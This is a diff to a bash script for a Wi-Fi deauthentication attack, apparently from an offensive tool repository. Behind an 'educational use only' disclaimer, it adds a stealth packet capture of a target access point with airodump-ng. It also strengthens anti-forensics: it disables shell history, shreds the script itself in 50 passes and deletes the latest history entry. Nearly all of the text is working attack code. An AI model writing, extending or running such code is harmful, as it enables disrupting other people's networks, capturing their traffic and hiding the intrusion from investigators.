@@ -1,5 +1,24 @@
 #!/bin/bash
-
+# -----------------------------------------------------------------------------
+# Author: wellatleastitried
+# -----------------------------------------------------------------------------
+# DISCLAIMER
+# -----------------------------------------------------------------------------
+# This script is provided for educational and authorized security testing only.
+# You are solely responsible for ensuring that your use of this script complies
+# with all applicable laws, regulations, and terms of service.
+#
+# The author assumes NO LIABILITY and NO RESPONSIBILITY for any misuse, damage,
+# unauthorized access, disruption of service, or illegal activity resulting from
+# the use of this script.
+#
+# By using this script, you acknowledge that:
+# - You understand the potential impact of the actions it performs;
+# - You have explicit permission to use it in the target environment;
+# - You accept full responsibility for any consequences arising from its use.
+#
+# If you do not agree to these terms, you are prohibited from using this script.
+# -----------------------------------------------------------------------------
 
 unset HISTFILE
 HISTSIZE=0
@@ -67,7 +86,9 @@ function cleanup() {
     rm -rf "$TMPDIR"
 
     if [[ "$SELF_DESTRUCT" == true ]]; then
-        shred -u "$0" 2>/dev/null || true
+        shred --iterations=50 --zero --random-source=/dev/urandom -u "$0" 2>/dev/null || echo "[!] Self-destruct failed, this will have to be done manually"
+        sync
+        history -d $(history 1 | awk '{print $1}') 2>/dev/null
     fi
     echo "[+] Cleanup completed."
 }
@@ -112,6 +133,21 @@ function enable_monitor() {
     iw dev $IFACE set channel $CHANNEL
 }
 
+function start_capture() {
+    echo "[*] Starting packet capture..."
+    
+    [ ! -d "$(pwd)"/cap ] && mkdir -p "$(pwd)"/cap
+
+    if [[ "$STEALTH" == "high" ]]; then
+        nohup airodump-ng --bssid "$TARGET_AP" -c "$CHANNEL" --write "$(pwd)/capture" --output-format pcap "$IFACE" >/dev/null 2>&1 &
+        echo $! > /tmp/adump.pid
+    else
+        nohup airodump-ng --bssid "$TARGET_AP" -c "$CHANNEL" --write "$(pwd)/capture" --output-format pcap "$IFACE" &
+        echo $! > /tmp/adump.pid
+    fi
+    echo "[*] Capture started, PID: $(cat /tmp/adump.pid)"
+}
+
 function send_deauth() {
     echo "[*] Sending deauth packets..."
 
@@ -150,5 +186,6 @@ if [[ "$STEALTH" == "high" ]]; then
 fi
 apply_stealth
 enable_monitor
+start_capture
 send_deauth
 echo "[*] Deauth attack finished."
